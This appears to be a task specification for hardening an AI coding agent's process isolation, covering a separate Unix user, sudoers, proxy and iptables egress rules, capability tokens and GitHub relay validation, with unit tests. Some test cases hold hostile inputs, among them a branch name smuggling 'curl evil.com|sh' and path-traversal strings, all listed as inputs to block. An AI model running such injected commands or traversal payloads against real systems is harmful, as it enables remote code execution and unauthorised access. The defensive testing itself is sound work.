# Agent Process Isolation & Credential Hardening — Tasks

## ROADMAP Item Grouping

- **Item 83 (A)**: Setup script (user, sudoers, token hardening, proxy, iptables, askpass helper)
- **Item 84 (B)**: Core wiring (config, agent-server.ts, spawn change, session cap_token,
  per-session clone model via worktree-manager.ts)
- **Item 85 (C)**: MCP changes (remove git_credential, github_forward relay with raw path
  validation + repo scope, push_branch with bundle handoff, pr tools)
- **Item 86 (D)**: Startup checks, ClaudeCodeAdapter block, concurrent-project guard, docs, Tier 2 tests

Order: 83 → 84 → 85 → 86.

---

## Item 83: Setup script + infrastructure

### Task 83.1: Write `scripts/setup-agent-user.sh`

Idempotent bash script, runs as root. Steps:

1. Create `agentworker` with home dir at `/home/agentworker`:
   `id -u agentworker &>/dev/null || useradd -r -s /usr/sbin/nologin -d /home/agentworker -m agentworker`

2. Write `/etc/sudoers.d/agent-router-worker` (mode 440) from `$KIRO_PATH`:
   - `AGENT_ROUTER_SESSION_ID`, `WORKDIR`, `AGENT_ROUTER_AGENT_SOCK`, `AGENT_ROUTER_CAP_TOKEN`,
     `HTTPS_PROXY` in `env_keep`
   - `NOPASSWD: $KIRO_PATH acp`
   - Validate with `visudo -c -f`

3. Harden `$rootDir` and token files (mode 600, `agentrouter` owner):
   `chmod 750 $ROOTDIR; chmod 600 $ROOTDIR/tokens.json $ROOTDIR/daemon-token $ROOTDIR/config.json`

4. Create `/srv/agent-router/worktrees/` (mode 755, `agentrouter:agentrouter`)

5. Create `/run/agent-router/` via `tmpfiles.d` with the **setgid** bit so the agent socket inherits group `agentworker` automatically:
   `echo 'd /run/agent-router 2750 agentrouter agentworker -' > /etc/tmpfiles.d/agent-router.conf && systemd-tmpfiles --create /etc/tmpfiles.d/agent-router.conf`

6. Install and configure tinyproxy (Task 83.2)

7. Install iptables rules atomically (Task 83.3)

8. Print summary and instructions for operator

Requirements: FR-1.1, FR-2.1, FR-3.1, FR-3.4, FR-4.2, FR-7.1–7.3

### Task 83.2: tinyproxy configuration

Install tinyproxy. Write `/etc/tinyproxy/tinyproxy.conf` and `/etc/tinyproxy/filter` as
specified in design §B. Enable and start `tinyproxy.service`. Add iptables REJECT for
tinyproxy's uid targeting `169.254.0.0/16` and RFC1918 ranges (prevents SSRF through proxy).

Requirements: FR-7.1

### Task 83.3: iptables rules + systemd persistence unit

Implement `setup_iptables()` function in `setup-agent-user.sh` as per design §G:
- Build IPv4 chain rules in a tempfile (ONLY `:AGENTWORKER_OUT - [0:0]` and its rules, NO built-in policy lines)
- Include tinyproxy REJECT rules (RFC1918 + metadata 169.254/16) as a `TINYPROXY_OUT` chain inside the same file, plus an idempotent jump from OUTPUT owner-matched to tinyproxy's uid (`-m owner --uid-owner tinyproxy -j TINYPROXY_OUT`)
- Apply with `iptables-restore --noflush`
- Install jump rule **idempotently**: `iptables -C OUTPUT -m owner --uid-owner agentworker -j AGENTWORKER_OUT 2>/dev/null || iptables -I OUTPUT 1 -m owner --uid-owner agentworker -j AGENTWORKER_OUT`
- Mirror with `ip6tables-restore --noflush` (IPv6 version with RFC4193 + link-local)
- **Do NOT** use `iptables-save`/`ip6tables-save` — that would dump all chains including Docker/ufw
- Write rules to `/etc/iptables/agent-router-rules.v4` and `/etc/iptables/agent-router-rules.v6`

Create `/etc/systemd/system/agent-router-iptables.service`:
```
[Unit]
Description=agent-router iptables rules
Before=agent-router.service
DefaultDependencies=no

[Service]
Type=oneshot
RemainAfterExit=yes
ExecStart=/sbin/iptables-restore --noflush /etc/iptables/agent-router-rules.v4
ExecStart=/sbin/ip6tables-restore --noflush /etc/iptables/agent-router-rules.v6
ExecStartPost=/bin/sh -c 'iptables -C OUTPUT -m owner --uid-owner agentworker -j AGENTWORKER_OUT 2>/dev/null || iptables -I OUTPUT 1 -m owner --uid-owner agentworker -j AGENTWORKER_OUT'
ExecStartPost=/bin/sh -c 'ip6tables -C OUTPUT -m owner --uid-owner agentworker -j AGENTWORKER_OUT 2>/dev/null || ip6tables -I OUTPUT 1 -m owner --uid-owner agentworker -j AGENTWORKER_OUT'
ExecStartPost=/bin/sh -c 'UID=$(id -u tinyproxy); iptables -C OUTPUT -m owner --uid-owner "$UID" -j TINYPROXY_OUT 2>/dev/null || iptables -I OUTPUT 1 -m owner --uid-owner "$UID" -j TINYPROXY_OUT'
ExecStartPost=/bin/sh -c 'UID=$(id -u tinyproxy); ip6tables -C OUTPUT -m owner --uid-owner "$UID" -j TINYPROXY_OUT 2>/dev/null || ip6tables -I OUTPUT 1 -m owner --uid-owner "$UID" -j TINYPROXY_OUT'

[Install]
WantedBy=multi-user.target
```

Enable with `systemctl enable --now agent-router-iptables.service`.

Requirements: FR-7.2, FR-7.4

### Task 83.4: README "Security Setup" section

Document prerequisites, setup command, what it does, how to enable (`useWorkerUid: true`),
and AC-1 through AC-10 verification commands.

Requirements: FR-1.2

---

## Item 84: Core wiring — config, agent socket, MCP transport, spawn, cap-token, per-session clone

### Task 84.1: Add config fields in `src/config.ts`

Add to `AgentRouterConfig`:
- `useWorkerUid?: boolean` (default `false`)
- `worktreeBase?: string` (default `/srv/agent-router/worktrees`; used only when `useWorkerUid=true`)
- `agentSocketPath?: string`. When unset, the effective default is `/run/agent-router/agent.sock` if `useWorkerUid=true`, else `path.join(rootDir, 'agent.sock')`. Export `resolveAgentSocketPath(config, rootDir): string` and use it everywhere.
- `githubForwardAllowList?: Array<{ methods: string[]; pathPattern: string }>`

Add `useWorkerUid`, `worktreeBase` and `agentSocketPath` to the restart-required set in `classifyConfigChange`.

### Task 84.2: Add `SpawnOpts` fields in `src/agent-adapter.ts`

```typescript
useWorkerUid?: boolean;
capToken?: string;
agentSocketPath?: string;
cwd?: string;
```

### Task 84.3: Create `src/agent-server.ts`: socket creation, group ownership, verification

Export `startAgentServer(deps)` implementing the startup sequence from design §C:
1. When `useWorkerUid=true`: resolve `agentworkerGid` via `getent group agentworker`; verify daemon is a supplementary member; verify socket directory (setgid, no group write, group = `agentworkerGid`).
2. Unlink stale socket ONLY if `lstat().isSocket()` — refuse to unlink other file types.
3. `server.listen(path)`.
4. `fs.chownSync(path, -1, gid)` → `fs.chmodSync(path, mode)` → verify inode (uid, gid, mode, isSocket).
5. If any check fails with `useWorkerUid=true`, close server and throw `FatalError` (daemon exits 1).
6. `useWorkerUid=false`: skip gid resolution, chown, directory checks; chmod `0o600`.
7. Provide injectable `resolveGid` and `getGroups` parameters for tests.

### Task 84.4: `src/agent-server.ts`: protocol, auth, dispatch

1. Newline-delimited JSON. One request line → one response line → end connection. Cap request at 1 MB.
2. Every op calls `sessionMgr.validateCapToken(session_id, cap_token)` first. Failure → `{error:"Unauthorized"}`.
3. Dispatch all ops from the exhaustive table in design §C to the same handler functions `cli-server.ts` uses. Extract shared handlers into `src/session-ops.ts` if they are inline in `cli-server.ts`.
4. `register_worktree`: when `useWorkerUid=true`, accept only `path === sessionMgr.getWorktreePath(session_id)`.
5. `github_http_forward` → `github_forward` op (design §E). `push_branch` (design §H). `pr_create`, `pr_view`: REST via existing GitHub client.
6. `get_token`, `git_credential`, `new_session` → `{error:"Unknown op"}`.
7. `github_forward` PAT from token resolver for the session's bound repo, never from a caller argument. `push_branch` PAT via `GIT_ASKPASS_PASSWORD` env + `/usr/local/libexec/agent-router-askpass`.

### Task 84.5: Route ALL MCP tools through the agent socket (`src/mcp-server.ts`)

1. Replace `McpContext` — delete `daemonSocket`, add `agentSocket` and `capToken`.
2. Add one helper `callAgent(op, args)` that calls `sendToDaemon(agentSocket, { op, session_id: sessionId, cap_token: capToken, ...args })`.
3. Rewrite every `case` in `handleToolsCall` to use `callAgent`. No other `sendToDaemon` call may remain in the file.
4. Delete: `git_credential` tool definition and case, `getSessionProject`, `cachedProject`, every `get_token` call, in-process GitHub `fetch`, `credential-validators.js` import.
5. Rewrite `runMcpServerFromEnv()` to require `AGENT_ROUTER_AGENT_SOCK` and `AGENT_ROUTER_CAP_TOKEN`, exit 1 if either is missing. Never read `AGENT_ROUTER_SOCKET`.
6. Acceptance check: `grep -n "AGENT_ROUTER_SOCKET\|get_token\|daemonSocket" src/mcp-server.ts` returns nothing.

### Task 84.6: Modify `src/session-mgr.ts`

1. Add `setCapToken`, `validateCapToken` (timingSafeEqual, length check first), `clearCapToken`, `getSessionRepo`, `getSessionReadRepos`, `getWorktreePath`.
2. Replace `daemonSocket` option with `agentSocketPath: string`.
3. Make `acpSpawner` async: `async (sessionId, repo, capToken) => …`. Before each spawn, generate `const capToken = crypto.randomUUID().replace(/-/g, '')`, `setCapToken(sessionId, capToken)`, then await spawn.
4. Build `mcpServers[0].env` as exactly `[AGENT_ROUTER_SESSION_ID, AGENT_ROUTER_AGENT_SOCK, AGENT_ROUTER_CAP_TOKEN]`. Never include `AGENT_ROUTER_SOCKET` or `GITHUB_API_BASE_URL`.
5. Pass session's `WORKDIR` as `cwd` of `session/new`.
6. FR-4.6 concurrent-project guard in `createSession()` and `resumeSessions()`.
7. On session end: `clearCapToken(sessionId)`, then `await worktreeManager.removeWorktree(sessionId)`. Then, when `useWorkerUid=true` and no other `agentworker` session is still active (check session count before pkill), run `sudo -n pkill -KILL -u agentworker` to clean up any orphaned processes.

### Task 84.7: Modify `KiroAdapter.spawn()` in `src/adapters/kiro.ts`

When `opts.useWorkerUid=true`:
- `spawnFn('/usr/bin/sudo', ['-n', '-u', 'agentworker', deps.kiroPath, 'acp'], env, { cwd: opts.cwd ?? '/' })`.
- `env` = `opts.env` minus `GITHUB_TOKEN`, minus every `AGENT_ROUTER_*` key other than the four needed, plus `AGENT_ROUTER_SESSION_ID`, `AGENT_ROUTER_AGENT_SOCK`, `AGENT_ROUTER_CAP_TOKEN`, `HTTPS_PROXY: 'http://127.0.0.1:8080'`.
- Throw if `opts.capToken` or `opts.agentSocketPath` is empty.

When `opts.useWorkerUid=false`: existing spawn args unchanged, agent socket vars still added to env.

### Task 84.8: Per-session clone: wrappers, sudoers, setup-script extension

1. Add `scripts/libexec/agent-router-seed-clone` and `scripts/libexec/agent-router-rm-session` with exact contents from design §D.
2. Extend `scripts/setup-agent-user.sh`:
   - Install both wrappers to `/usr/local/libexec/` (root:root 0755).
   - `usermod -aG agentworker agentrouter`.
   - Write systemd drop-in `SupplementaryGroups=agentworker`, then `systemctl daemon-reload`.
   - Assert `agentworker` is NOT in group `agentrouter`.
   - Append to `/etc/sudoers.d/agent-router-worker` the two wrapper sudoers lines from design §D; re-validate with `visudo -c -f`.
   - Remove any `/usr/bin/git` sudoers lines from prior spec drafts.
   - Create `/srv/agent-router/worktrees/` (agentrouter:agentrouter 0755) and `/srv/agent-router/push-tmp/` (agentrouter:agentrouter 0700).
   - `echo 'd /run/agent-router 2750 agentrouter agentworker -' > /etc/tmpfiles.d/agent-router.conf && systemd-tmpfiles --create`.
3. Smoke test: `sudo -n -u agentworker /usr/local/libexec/agent-router-seed-clone 'bad/sid'` must exit 64.
4. Verify kiro, node, and the MCP server entry point are accessible to `agentworker`. All three must NOT be under `/home/agentrouter` (agentworker cannot traverse that directory). Run `sudo -u agentworker test -x <kiroPath>`, `sudo -u agentworker test -x $(which node)`, and `sudo -u agentworker test -r <mcpServerEntryPoint>` — fail daemon startup with a clear error if any check fails. `mcpServerEntryPoint` is the path resolved by `resolveMcpServerCommand(moduleDir)` in `index.ts`.
5. Add pkill sudoers line: `agentrouter ALL=(root) NOPASSWD: /usr/bin/pkill -KILL -u agentworker`.

### Task 84.9: `worktree-manager.ts`: replace `git worktree add` with per-session clone

1. Make `ensureWorktree(repo, sessionId): Promise<string>` async in both modes.
2. In `useWorkerUid=false`: wrap existing `git worktree add` with `execFileAsync`, unchanged behavior.
3. In `useWorkerUid=true`: implement session start steps 1–9 from design §D. Modes must be set explicitly with `chmodSync` after create — never rely on umask. The only git commands the daemon runs are in its own bare clone (fetch, bundle create).
4. `getWorktreePath(sid)` returns `{worktreeBase}/{sid}/work`.

### Task 84.10: `worktree-manager.ts`: session cleanup

Make `removeWorktree(sid): Promise<void>` async.
- `useWorkerUid=true`: `sudo -n -u agentworker /usr/local/libexec/agent-router-rm-session {sid}` with `cwd: '/'`, 120 s timeout. On exit 0, `fs.rmSync({sid}, { recursive: true, force: true })`. On failure, log ERROR and leave directory.
- `useWorkerUid=false`: existing behavior.

### Task 84.11: `src/index.ts` wiring

1. Remove `GITHUB_TOKEN` from spawn env when `useWorkerUid=true`; log WARNING if present.
2. Make `acpSpawner` async. `const workdir = await worktreeManager.ensureWorktree(repo, sessionId)` replaces the synchronous call. When `useWorkerUid=true` and `ensureWorktree` throws, rethrow — never start a session without its isolated clone.
3. Compute `agentSocketPath = resolveAgentSocketPath(config, rootDir)` before `createSessionManager`. Delete `mcpExtraEnv`/`GITHUB_API_BASE_URL` forwarding.
4. Start `agentServer = await startAgentServer(...)` before `sessionMgr.resumeSessions()`. Add to shutdown handler.
5. Startup log: `log.info('Process isolation config', { useWorkerUid, agentSocketPath })`.

### Task 84.12: Unit tests — `test/tier1/kiro-adapter.test.ts`

1. `useWorkerUid: false`: spawnImpl called with `(kiroPath, ['acp'], env)`.
2. `useWorkerUid: true`: spawnImpl called with `('/usr/bin/sudo', ['-n', '-u', 'agentworker', kiroPath, 'acp'], env, { cwd: '/' })`.
3. `useWorkerUid: true` + `GITHUB_TOKEN`, `AGENT_ROUTER_SOCKET`, `AGENT_ROUTER_HOME` in opts.env: none present in env passed to spawnImpl.
4. `useWorkerUid: true`: env contains 32-hex `AGENT_ROUTER_CAP_TOKEN` and `AGENT_ROUTER_AGENT_SOCK`.
5. `useWorkerUid: true` with empty `capToken` → throws.

### Task 84.13: Unit tests — `test/tier1/agent-server.test.ts`

1. `useWorkerUid=true`, setgid-group temp dir: after `startAgentServer`, socket is `isSocket()`, uid = process, gid = target gid, mode `0o660`.
2. Same but dir NOT setgid: gid still correct (proves explicit `chownSync` runs).
3. Daemon not in agentworker group → `FatalError` matching `/not a member of group agentworker/`.
4. Dir mode `0o2770` (group-writable) → `FatalError`.
5. Regular file at socket path → `FatalError` (`/is not a socket/`), file not deleted.
6. `useWorkerUid=false` → socket mode `0o600`, gid = `process.getgid()`.

### Task 84.14: Unit tests — `test/tier1/mcp-server.test.ts`

1. Two fake Unix sockets A (agent) and O (operator). All 7 tools (`session_status`, `register_pr`, `merge_pr`, `complete_session`, `register_worktree`, `report_outcome`, `github_http_forward`) go to A; O receives zero connections.
2. `github_http_forward` sends `op:'github_forward'`; no request has `op:'get_token'`.
3. `runMcpServerFromEnv` with `AGENT_ROUTER_AGENT_SOCK` unset (but `AGENT_ROUTER_SOCKET` set) → exits 1 with `AGENT_ROUTER_AGENT_SOCK environment variable is required`.
4. `AGENT_ROUTER_CAP_TOKEN` unset → exits 1.
5. In `session-mgr.test.ts`: `mcpServers[0].env` names are exactly `AGENT_ROUTER_SESSION_ID`, `AGENT_ROUTER_AGENT_SOCK`, `AGENT_ROUTER_CAP_TOKEN`. Resume generates a different cap token; old token fails `validateCapToken`.

### Task 84.15: Unit tests — `test/tier1/worktree-manager.test.ts`

With injected `exec` mock and temp `worktreeBase`:
1. `ensureWorktree` with `useWorkerUid=true` calls, in order: git fetch in bare clone; `git … bundle create …`; then `/usr/bin/sudo -n -u agentworker /usr/local/libexec/agent-router-seed-clone {sid}` with `cwd: '/'`.
2. No exec call contains `worktree` in args; no exec has `cwd`/`-C`/`GIT_DIR` under `work/`.
3. Before sudo: `{sid}/` mode `0o750`, `seed.bundle`/`repo` mode `0o640`, `work/` mode `0o2770`. After success, `seed.bundle` deleted.
4. `sid = '../x'` or `'a/b'` → rejects before any exec.
5. Failing seed-clone exec → `removeWorktree` invoked and promise rejects.
6. `removeWorktree` calls the rm wrapper before `fs.rmSync({sid})`. Wrapper failure leaves `{sid}/`.
7. Wrapper scripts (bash required; skip otherwise): `agent-router-seed-clone` with zero/two args, `'..'`, or `'a/b'` exits 64. Same for `agent-router-rm-session`.

### Task 84.16: Audit and eliminate daemon-side git in session worktrees

Ensure no daemon code runs git with `cwd`, `-C`, or `GIT_DIR` pointing inside `{sid}/work/`. The agent controls `.git/config` there, so running git as `agentrouter` executes agent-controlled hooks.

1. Grep `src/` for: `execFile*.*'git'`, `cwd:.*work`, `-C.*work`, `GIT_DIR.*work`. Document every hit in a checklist comment in this task's PR body.
2. For each hit: either route through a fixed sudo wrapper (as `agentworker`), or redirect to the daemon's bare clone path. No daemon git call should have cwd/`-C`/`GIT_DIR` pointing into `{sid}/work/`.
3. Update `AttemptRunner` and `WorktreeOps` call sites found in step 1. Ensure `readOutcomeFile` uses `O_NOFOLLOW`.
4. Also fix `loadSession` in `acp.ts` to pass `WORKDIR` as `cwd` (FR-3.4.5) — today it sends `process.cwd()`.
5. Acceptance test: a test that instruments `execFile` and asserts no git call has `cwd`/`-C` matching `*/work/*`.

Requirements: FR-3.4.5, FR-3.5

---

## Item 85: MCP tool changes

### Task 85.1: Remove `git_credential` from `src/mcp-server.ts`

Remove from `MCP_TOOLS` and `handleToolsCall`. Assert in test that `tools/list` has no
`git_credential` entry (AC-3).

### Task 85.2: Redesign `github_http_forward` as thin relay

`github_http_forward` relay is implemented in Task 84.5 (`callAgent('github_forward', …)` on `AGENT_ROUTER_AGENT_SOCK`). There is **no** `?? process.env['AGENT_ROUTER_SOCKET']` fallback. This task only verifies that the following are removed from `mcp-server.ts`:
- The `get_token` call and `githubApiBaseUrl`
- `GITHUB_API_BASE_URL`
- The credential validators import and `logCredentialCall`
- Any fallback to `AGENT_ROUTER_SOCKET`

Acceptance: `grep -n "AGENT_ROUTER_SOCKET\|get_token\|githubApiBaseUrl\|credential-validators" src/mcp-server.ts` returns nothing.

### Task 85.3: Add `push_branch` MCP tool (thin relay)

Tool definition + relay handler to agent socket `push_branch` op.

### Task 85.4: Add `pr_create` and `pr_view` MCP tools (thin relays)

Tool definitions + relay handlers.

### Task 85.5: Fix `acp.ts` comment

Update the comment at `acp.ts:186-193` (or wherever) that lists MCP tool names: remove
`git_credential`, update tool count.

### Task 85.6: Unit tests

In `test/tier1/mcp-server.test.ts`:
1. `tools/list` has no `git_credential`.
2. `github_http_forward` sends `op:'github_forward'` (not `get_token`) to daemon socket.
3. `push_branch` sends `op:'push_branch'` to daemon socket.

In `test/tier1/agent-server.test.ts` (new):
1. `get_token` op → `{error:"Unknown op"}` (AC-10)
2. Wrong `cap_token` → `{error:"Unauthorized"}`
3. Empty `cap_token` → `{error:"Unauthorized"}`
4. `GET /repos/o/r/pulls/1` → allowed (AC-5)
5. `POST /repos/o/r/hooks` → `{error:"not permitted"}` (AC-4)
6. `GET /repos/o/r/pulls/%2e%2e` → `{error:"not permitted"}` (AC-6)
7. Path `\repos\o\r\hooks` (backslash) → blocked
8. Path `/repos/o/r/pulls/1%5c../hooks` → blocked
9. `PATCH /repos/o/r/pulls/1` with `{base:"main"}` → blocked
10. `PATCH /repos/o/r/pulls/1` with `{title:"fix"}` → allowed
11. `POST /repos/o/r/pulls` with `{base:"main"}` → blocked (main is a protected push-target branch)
12. `push_branch` with `branch:"main"` → `{error:"Protected branch"}`
13. `push_branch` with `branch:"agent/fix"` → allowed (mocked `execFile`)
14. `push_branch` with `branch:"agent/x;curl evil.com|sh"` → blocked (pattern check)
15. `push_branch` with `branch:"agent/x:main"` → blocked (`:` rejected)

---

## Item 86: Startup checks, ClaudeCodeAdapter block, docs, Tier 2 tests

### Task 86.1: Startup checks in `src/index.ts`

```typescript
// Called in main() after loadConfig(), before session manager init:
checkTokenFilePermissions(rootDir, log);  // existing plan, checks mode & 0o044
checkIptablesRules(log);                  // reads /etc/iptables/agent-router-rules.v4
log.info('Process isolation config', { useWorkerUid: config.useWorkerUid ?? false });
```

`checkIptablesRules` uses `fs.readFileSync('/etc/iptables/agent-router-rules.v4', 'utf-8')` (no `execSync`,
no `CAP_NET_ADMIN`). Checks for string `'AGENTWORKER_OUT'`. Logs WARNING if absent or file
unreadable (AC-7).

### Task 86.2: ClaudeCodeAdapter safe-failure

In acpSpawner lambda or before `adapter.spawn()`:
```typescript
if ((config.useWorkerUid ?? false) && adapter.name === 'claude-code') {
  log.error('useWorkerUid not supported for claude-code adapter — refusing session', { repo });
  throw new Error('useWorkerUid not supported for claude-code adapter');
}
```

### Task 86.3: `docs/security-setup.md`

Operator guide covering:
- Prerequisites and install commands
- Step-by-step setup with expected output
- kiro auth for agentworker: `sudo -u agentworker kiro-cli login`
- Verification commands (AC-1 through AC-10)
- Residual risks and mitigations
- Revert/debug steps (re-enable `useWorkerUid: false`, restore token permissions)

### Task 86.4: Tier 2 tests in `test/tier2/agent-isolation.test.ts`

1. Session spawned with `useWorkerUid: true` does NOT receive `GITHUB_TOKEN` in env.
2. Agent socket exists at `agentSocketPath` with mode that group-members can connect to (0660).
3. Operator socket at `$rootDir/sock` is mode 0600.
4. `github_forward` with disallowed path returns error without executing any GitHub API call.
5. `push_branch` with protected branch name returns error without running any `execFile`.

---

## ROADMAP Entries (to add in this spec's PR)

```markdown
### 83. Agent process isolation — setup script, user, proxy, iptables, rootDir hardening

Read `.kiro/specs/agent-process-isolation/requirements.md`, `design.md`, and `tasks.md` in
full, then implement tasks `83.1`, `83.2`, `83.3`, `83.4`.

- Spec: `.kiro/specs/agent-process-isolation/` · tasks `83.1–83.4`
- [x] Complete · PR: #149

---

### 84. Agent process isolation — config, agent socket, spawn change, cap-token, worktree base

Read `.kiro/specs/agent-process-isolation/requirements.md`, `design.md`, and `tasks.md` in
full, then implement tasks `84.1`, `84.2`, `84.3`, `84.4`, `84.5`, `84.6`, `84.7`, `84.8`, `84.9`, `84.10`, `84.11`, `84.12`, `84.13`, `84.14`, `84.15`, `84.16`.
Depends on item 83 (user, socket dir, worktree dir must exist).

- Spec: `.kiro/specs/agent-process-isolation/` · tasks `84.1–84.16`
- [x] Complete · PR: #150

---

### 85. Agent process isolation — MCP changes (remove git_credential, github_forward relay, push_branch)

Read `.kiro/specs/agent-process-isolation/requirements.md`, `design.md`, and `tasks.md` in
full, then implement tasks `85.1`, `85.2`, `85.3`, `85.4`, `85.5`, `85.6`. Depends on item 84
(agent socket and cap_token in place).

- Spec: `.kiro/specs/agent-process-isolation/` · tasks `85.1–85.6`
- [x] Complete · PR: #151

---

### 86. Agent process isolation — startup checks, ClaudeCodeAdapter block, Tier 2 tests, docs

Read `.kiro/specs/agent-process-isolation/requirements.md`, `design.md`, and `tasks.md` in
full, then implement tasks `86.1`, `86.2`, `86.3`, `86.4`. Depends on items 83, 84, 85.

- Spec: `.kiro/specs/agent-process-isolation/` · tasks `86.1–86.4`
- [x] Complete · PR: #152
```
